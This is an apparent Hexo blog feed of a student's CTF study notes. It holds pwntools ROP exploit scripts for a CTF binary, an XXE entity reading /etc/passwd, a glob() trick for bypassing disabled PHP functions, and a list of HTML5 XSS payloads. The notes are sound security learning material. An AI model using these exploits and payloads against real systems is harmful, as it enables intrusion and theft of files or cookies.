      
        
    </entry>
    
    <entry>
      <title><![CDATA[条件竞争]]></title>
      <url>/2017/04/13/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/</url>
      <content type="html"><![CDATA[<p>好菜啊，看0ctf的wp才看到这个东西</p>
<p>仔细看了看就是互锁,临界区之类的问题，好像在上学期学的某门课里学过，先mark一下</p>
<p><a href="http://www.freebuf.com/articles/network/107077.html" target="_blank" rel="external">http://www.freebuf.com/articles/network/107077.html</a></p>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 周四 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[pwn入门]]></title>
      <url>/2017/04/13/pwn%E5%85%A5%E9%97%A8/</url>
      <content type="html"><![CDATA[<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ol>
<li>pwntools or zio<br> 用来写payload的库</li>
<li>ida<br> 调调调</li>
<li>socat<br> 我暂且认为他可以把题目的输入重新定向到某个端口上<br> 第一次跑<pre><code> socat TCP4-LISTEN:123456,fork EXEC:./rop_rop_rop
</code></pre> 地址复用<pre><code> socat TCP-LISTEN:123456,reuseaddr,fork EXEC:./rop_rop_rop
</code></pre></li>
</ol>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol>
<li>down下题目来, ida分析<br> 例如, <code>syc</code> 的 <code>rop_rop_rop</code>, 三次<code>rop</code></li>
<li><p>写出<code>payload</code>, <code>poc_local.py</code></p>
<pre class="line-numbers language-python"><code class="language-python"> <span class="token comment" spellcheck="true">#!/usr/bin/python</span>
 <span class="token comment" spellcheck="true">#encoding: utf-8</span>
 <span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">12345</span><span class="token punctuation">)</span>

 step1Addr <span class="token operator">=</span> <span class="token number">0x0804871e</span>
 step2Addr <span class="token operator">=</span> <span class="token number">0x08048766</span>
 step3Addr <span class="token operator">=</span> <span class="token number">0x080487a3</span>
 mainAddr  <span class="token operator">=</span> <span class="token number">0x0804867d</span>
 shellcodeBuf <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">7</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">9</span>

 payload1 <span class="token operator">=</span> shellcodeBuf <span class="token operator">+</span> p32<span class="token punctuation">(</span>step1Addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>mainAddr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x41414141</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\xd5\xc4\xb3\xa2'</span>
 payload2 <span class="token operator">=</span> shellcodeBuf <span class="token operator">+</span> p32<span class="token punctuation">(</span>step2Addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>mainAddr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xff25a7d4</span><span class="token punctuation">)</span><span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x41414141</span><span class="token punctuation">)</span>
 payload3 <span class="token operator">=</span> shellcodeBuf <span class="token operator">+</span> p32<span class="token punctuation">(</span>step3Addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>mainAddr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xc0c0c0c</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x9a829a82</span><span class="token punctuation">)</span>
 r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
 r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
 r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload3<span class="token punctuation">)</span>
 r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>本地调试</p>
<ol>
<li>先启动<code>socat</code>, 打开题目<code>rop_rop_rop</code><pre class="line-numbers language-bash"><code class="language-bash">socat TCP4-LISTEN:12345,fork EXEC:./rop_rop_rop
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
这样<code>rop_rop_rop</code>就跑在<code>localhost</code>的<code>12345</code>端口了</li>
<li>跑一下脚本<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chmod</span> 775 ./poc_local.py
./poc_local.py
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>然后就会弹回来一个<code>shellcode</code></li>
</ol>
</li>
<li><p>然后把脚本里的地址改为题目地址和端口, 跑一遍出结果就可以了</p>
</li>
</ol>
<h2 id="别的"><a href="#别的" class="headerlink" title="别的"></a>别的</h2><p>把</p>
<pre class="line-numbers language-python"><code class="language-python">r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">12345</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>改成</p>
<pre class="line-numbers language-python"><code class="language-python">r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./rop_rop_rop'</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这样子就可以不启动socat,进行调试了，但好像弹回来的<code>shell</code>有点问题，不能用</p>
<h2 id="简单的pwn模板"><a href="#简单的pwn模板" class="headerlink" title="简单的pwn模板"></a>简单的pwn模板</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#encoding: utf-8</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"xxx.xxx.xxx.xxx"</span><span class="token punctuation">,</span> <span class="token number">12345</span><span class="token punctuation">)</span>

retAddr <span class="token operator">=</span> <span class="token number">0x080484A4</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">140</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>retAddr<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># use "'A' * 140" to padding the buf</span>

r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="todo"><a href="#todo" class="headerlink" title="todo"></a>todo</h2><p><a href="https://github.com/ctfs/write-ups-2013/tree/master/pico-ctf-2013" target="_blank" rel="external">https://github.com/ctfs/write-ups-2013/tree/master/pico-ctf-2013</a> 的4个rop题目</p>
<h2 id="找到两篇不错的文章"><a href="#找到两篇不错的文章" class="headerlink" title="找到两篇不错的文章"></a>找到两篇不错的文章</h2><p><a href="http://paper.seebug.org/271/" target="_blank" rel="external">http://paper.seebug.org/271/</a><br><a href="http://paper.seebug.org/272/" target="_blank" rel="external">http://paper.seebug.org/272/</a></p>
<h2 id="继续"><a href="#继续" class="headerlink" title="继续"></a>继续</h2><p>x86架构有两种格式汇编</p>
<p>Intel</p>
<blockquote>
<p>op dst, src</p>
</blockquote>
<p>AT&amp;T    寄存器前加<code>%</code>，数值前加<code>$</code></p>
<blockquote>
<p>op src, dst</p>
</blockquote>
<p>典型的内存分段</p>
<pre><code>-------------------------------------
|High =========================== Low|
-------------------------------------
|Stack| ========= |Heap|BSS|Data|Code|
-------------------------------------
</code></pre><blockquote>
<p>代码段存储可执行代码和只读常量（如常量字符串），属性可读可执行，但通常不可写。数据段存储已经初始化且初值不为0的全局变量和静态局部变量，BSS段存储未初始化或初值为0的全局变量和静态局部变量，这两段数据都有可写的属性。</p>
</blockquote>
<p>CALL：调用指令，将当前的 eip 压入栈顶，并将 PTR 存入 eip，格式为</p>
<pre class="line-numbers language-asm"><code class="language-asm">CALL PTR;
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>RET：返回指令，操作为将栈顶数据弹出至 eip，格式为</p>
<pre class="line-numbers language-asm"><code class="language-asm">RET;
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>顺道吐槽一下，，网易云上<code>fripSide</code>的歌好像都不能听了。。。</p>
<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>最近还看到了<code>SROP</code>, <code>BROP</code> 真是可怕<br>常常要拼接出一次系统调用<code>SystemCall</code>,Linux下常常是<code>int 0x80</code> </p>
<blockquote>
<p>我的gdb里调试的时候并木有看到<code>int 0x80</code> 看到的就是<code>SystemCall</code></p>
</blockquote>
<p>在<code>SystemCall</code>之前，要把调用号存到<code>eax</code>, 然后调用参数按顺序存到<code>ebx</code>, <code>ecx</code>, <code>edx</code>, <code>esi</code>, <code>edi</code>.</p>
<blockquote>
<p>不过之前看到，，如果用栈的话，应该是逆序入栈的??</p>
</blockquote>
<p>125号调用</p>
<pre><code>mprotect (void *addr, size_t len, int prot)
</code></pre><p>能够将栈的属性改成可执行，这样就很开心了，，，突然感觉像某zcl的语气</p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 周四 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[日常]]></title>
      <url>/2017/04/11/%E6%97%A5%E5%B8%B8/</url>
      <content type="html"><![CDATA[<ol>
<li><p>看了一篇<code>pwn</code>入门</p>
<ul>
<li><a href="http://bobao.360.cn/learning/detail/695.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/695.html</a></li>
</ul>
</li>
<li><p>安装了传说中的<code>socat</code></p>
</li>
<li><p>调试了很简单的文件</p>
<pre class="line-numbers language-bash"><code class="language-bash">gdb ./format1
b <span class="token function">printf</span>
r
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>结果出现了:</p>
<pre class="line-numbers language-bash"><code class="language-bash">printf.c: 没有那个文件或目录
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>搜了半天发现要</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">source</span> libc6-dev
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>根据提示看，貌似应该用(不管他了)</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> clone https://anonscm.debian.org/git/pkg-glibc/glibc.git
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这个时候get了<code>glibc</code>源码(不知道是不是)<br>然后</p>
<pre><code>find ~/glibc-2.23 -name printf.c
</code></pre><pre><code>./stdio-common/printf.c
</code></pre><p>这个时候重新进入gdb</p>
<pre class="line-numbers language-bash"><code class="language-bash">gdb ./format1
directory ~/glibc-2.23/stdio-common/
b <span class="token function">printf</span>
r
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>就好了</p>
</li>
<li><p>mark了还没看的</p>
</li>
</ol>
<ul>
<li><a href="http://www.cnblogs.com/0xJDchen/p/6175651.html" target="_blank" rel="external">http://www.cnblogs.com/0xJDchen/p/6175651.html</a></li>
<li><a href="http://www.lucaroot.pw/" target="_blank" rel="external">http://www.lucaroot.pw/</a></li>
<li><a href="http://bestwing.me/page/5/" target="_blank" rel="external">http://bestwing.me/page/5/</a></li>
<li><a href="http://bobao.360.cn/ctf/detail/160.html" target="_blank" rel="external">http://bobao.360.cn/ctf/detail/160.html</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> 日记 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> diary </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[strings]]></title>
      <url>/2017/04/11/strings/</url>
      <content type="html"><![CDATA[<pre class="line-numbers language-bash"><code class="language-bash">strings <span class="token function">file</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"ctf"</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
]]></content>
      
        
        <tags>
            
            <tag> linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[php的Heredoc]]></title>
      <url>/2017/04/06/php%E7%9A%84Heredoc/</url>
      <content type="html"><![CDATA[<p>以前没见过，长见识了</p>
<p>表达字符串的方式</p>
<ol>
<li>单引号 (一切原样输出)</li>
<li>双引号</li>
<li><p>heredoc 句法结构：<code>&lt;&lt;&lt;</code><br> 特别注意的是结束标志不能缩进</p>
<pre class="line-numbers language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
 <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOD</span>
 Example of string
 spanning multiple lines
 using heredoc syntax<span class="token punctuation">.</span>
 <span class="token constant">EOD</span><span class="token punctuation">;</span>

 <span class="token comment" spellcheck="true">/* 含有变量的更复杂示例 */</span>
 <span class="token keyword">class</span> <span class="token class-name">foo</span>
 <span class="token punctuation">{</span>
     <span class="token keyword">var</span> <span class="token variable">$foo</span><span class="token punctuation">;</span>
     <span class="token keyword">var</span> <span class="token variable">$bar</span><span class="token punctuation">;</span>

     <span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
     <span class="token punctuation">{</span>
         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">foo</span> <span class="token operator">=</span> <span class="token string">'Foo'</span><span class="token punctuation">;</span>
         <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bar</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'Bar1'</span><span class="token punctuation">,</span> <span class="token string">'Bar2'</span><span class="token punctuation">,</span> <span class="token string">'Bar3'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span>

 <span class="token variable">$foo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">'MyName'</span><span class="token punctuation">;</span>

 <span class="token keyword">echo</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOT</span>
 My name is <span class="token string">"$name"</span><span class="token punctuation">.</span> I am printing some <span class="token variable">$foo</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">foo</span><span class="token punctuation">.</span>
 Now<span class="token punctuation">,</span> I am printing some <span class="token punctuation">{</span><span class="token variable">$foo</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bar</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">.</span>
 This should <span class="token keyword">print</span> a capital <span class="token string">'A'</span><span class="token punctuation">:</span> \<span class="token package">x41</span>
 <span class="token constant">EOT</span><span class="token punctuation">;</span>
 <span class="token delimiter">?></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-php"><code class="language-php"> My name is <span class="token string">"MyName"</span><span class="token punctuation">.</span> I am printing some Foo<span class="token punctuation">.</span>
 Now<span class="token punctuation">,</span> I am printing some Bar2<span class="token punctuation">.</span>
 This should <span class="token keyword">print</span> a capital <span class="token string">'A'</span><span class="token punctuation">:</span> A
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>nowdoc, 类似heredoc<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
<li><a href="http://php.net/manual/zh/language.types.string.php" target="_blank" rel="external">http://php.net/manual/zh/language.types.string.php</a></li>
</ol>
</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> php </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Note]]></title>
      <url>/2017/04/06/Note/</url>
      <content type="html"><![CDATA[<ol>
<li>glob遍历文件<br> 一次比赛的时候好多函数被禁, 其实可以用<code>glob</code>, 学到了<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token string">"./*"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$bdw</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token variable">$bdw</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token delimiter">?></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[XML & XXE]]></title>
      <url>/2017/04/06/XML-XXE/</url>
      <content type="html"><![CDATA[<h3 id="关于XML"><a href="#关于XML" class="headerlink" title="关于XML"></a>关于XML</h3><p>参考 </p>
<pre><code>1. 格式正规的XML
    - http://www.cnblogs.com/mengdd/archive/2013/05/27/3100884.html
2. 有效的XML
    - http://www.cnblogs.com/mengdd/archive/2013/05/28/3102893.html
3. DTD详解
</code></pre><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p>然后好蠢…终于知道XXE是<code>引入外部实体</code></p>
<h4 id="外部实体语法"><a href="#外部实体语法" class="headerlink" title="外部实体语法"></a>外部实体语法</h4><pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY 实体名 SYSTEM "URI/URL">
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>DTD</p>
<pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY writer SYSTEM "http://www.baidu.com/index.php?tn=coralqq">

&lt;!ENTITY copyright SYSTEM "http://www.baidu.com/index.php?tn=coralqq">
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>XML</p>
<pre class="line-numbers language-XML"><code class="language-XML"><author>&writer;&copyright;</author>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="XXE-例子"><a href="#XXE-例子" class="headerlink" title="XXE 例子"></a>XXE 例子</h4><pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY file SYSTEM “file:///etc/passwd”>  
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>附上学习blog<br><a href="http://blog.csdn.net/qq_19876131/article/details/51831522" target="_blank" rel="external">http://blog.csdn.net/qq_19876131/article/details/51831522</a></p>
<h2 id="XEE"><a href="#XEE" class="headerlink" title="XEE"></a>XEE</h2><p><a href="http://www.secpulse.com/archives/850.html" target="_blank" rel="external">http://www.secpulse.com/archives/850.html</a><br><a href="http://www.secpulse.com/archives/6256.html" target="_blank" rel="external">http://www.secpulse.com/archives/6256.html</a><br><a href="https://www.secpulse.com/archives/6392.html" target="_blank" rel="external">https://www.secpulse.com/archives/6392.html</a></p>
]]></content>
      
        
        <tags>
            
            <tag> XML </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[xss新向量[h5]]]></title>
      <url>/2017/04/05/xss%E6%96%B0%E5%90%91%E9%87%8F-h5/</url>
      <content type="html"><![CDATA[<h3 id="autofocus-属性"><a href="#autofocus-属性" class="headerlink" title="autofocus 属性"></a>autofocus 属性</h3><p>h5中为<code>input</code>, <code>textarea</code>, <code>button</code>, <code>select</code>, <code>keygen</code> 标签 加入了<code>autofocus</code>属性，所有就有如下的攻击向量</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">autofocus</span> <span class="token attr-name">onfocus</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>alert(1)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="SVG标签"><a href="#SVG标签" class="headerlink" title="SVG标签"></a>SVG标签</h3><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span> alert&amp;#40+&amp;#41<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span>     <span class="token comment" spellcheck="true">&lt;!--  可以引入html实体，会自解码 --></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-html"><code class="language-html">&lt;svg/onload=prompt(1)   <span class="token comment" spellcheck="true">&lt;!-- // 无需结束标签 --></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="formaction-属性"><a href="#formaction-属性" class="headerlink" title="formaction 属性"></a>formaction 属性</h3><p>用来覆盖form的action, 所以和submit配合用</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">formaction</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>javascript:alert(1)<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sbumit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
click me
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="video-amp-audio-标签"><a href="#video-amp-audio-标签" class="headerlink" title="video&amp;audio 标签"></a>video&amp;audio 标签</h3><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>video</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>alert(1)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>video</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>video</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>x</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>alert(1)<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>video</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>alert(1)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>source</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>source</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="srcdoc-属性"><a href="#srcdoc-属性" class="headerlink" title="srcdoc 属性"></a>srcdoc 属性</h3><p>不和当前页面共享域，这个域在<code>about:srcdoc</code></p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;lt;img&amp;equals;x:x onerror&amp;equals;alert&amp;lpar;1&amp;rpar;&amp;gt;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="srcset-属性"><a href="#srcset-属性" class="headerlink" title="srcset 属性"></a>srcset 属性</h3><p>可以代替src属性触发<code>onerror</code>事件</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">srcset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>,x<span class="token punctuation">"</span></span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>alert(1)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="picture-标签"><a href="#picture-标签" class="headerlink" title="picture 标签"></a>picture 标签</h3><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>picture</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">srcset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>alert(1)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>picture</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[about web-sec]]></title>
      <url>/2017/04/01/about-web-sec/</url>
      <content type="html"><![CDATA[<h2 id="写在前面的"><a href="#写在前面的" class="headerlink" title="写在前面的"></a>写在前面的</h2><ol>
<li>学习使用Linux系统 [先在虚拟机里]</li>
<li>github + hexo 来记录自己的学习历程 [超级好弄]</li>
<li>正则表达式</li>
<li>推荐案盲打 + VIM</li>
<li>浏览器FF + chrome</li>
</ol>
<a id="more"></a>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><ol>
<li><h3 id="关于web"><a href="#关于web" class="headerlink" title="关于web"></a>关于<code>web</code></h3><p> 我们不需要像web开发那样关注布局,美感</p>
<ol>
<li><p>前端</p>
<ul>
<li>html</li>
<li>css<br>  写在style标签里，共有三种嵌入html的方式<br>  作用:决定布局和样式</li>
<li>javascript<br>  写在script标签里</li>
<li>直接用<code>F12</code></li>
</ul>
</li>
<li><p>后台</p>
<ul>
<li>php</li>
<li>python [+]</li>
<li>node</li>
<li>java</li>
</ul>
</li>
</ol>
</li>
<li><h3 id="关于HTTP-浏览器输入网址后发生了什么"><a href="#关于HTTP-浏览器输入网址后发生了什么" class="headerlink" title="关于HTTP [浏览器输入网址后发生了什么]"></a>关于HTTP [浏览器输入网址后发生了什么]</h3><ol>
<li>给大家抓个包[burpsuite] =&gt; 并很自然的提到FF和chrome的插件</li>
<li>顺便安利markdown以及chrome的markdown插件</li>
<li>post请求，get请求 </li>
</ol>
</li>
<li><h3 id="常见的加密-amp-amp-编码"><a href="#常见的加密-amp-amp-编码" class="headerlink" title="常见的加密 &amp;&amp; 编码"></a>常见的加密 &amp;&amp; 编码</h3><ol>
<li>base64 [特点: 等号]</li>
<li>rot13 [还有其他各种rot]</li>
<li>常见的hash =&gt; md5 /sha1</li>
</ol>
</li>
<li><h3 id="熟悉常见的套路"><a href="#熟悉常见的套路" class="headerlink" title="熟悉常见的套路"></a>熟悉常见的套路</h3></li>
<li><h3 id="关于常见的漏洞-没有时间就不展开讲了"><a href="#关于常见的漏洞-没有时间就不展开讲了" class="headerlink" title="关于常见的漏洞 [没有时间就不展开讲了]"></a>关于常见的漏洞 [没有时间就不展开讲了]</h3><ol>
<li>前端<ol>
<li>xss<ul>
<li>反射型，存储型</li>
<li>推荐网站<ul>
<li><a href="http://prompt.ml/" target="_blank" rel="external">http://prompt.ml/</a></li>
<li><a href="https://alf.nu/alert1" target="_blank" rel="external">https://alf.nu/alert1</a></li>
</ul>
</li>
<li>窃取cookie<ul>
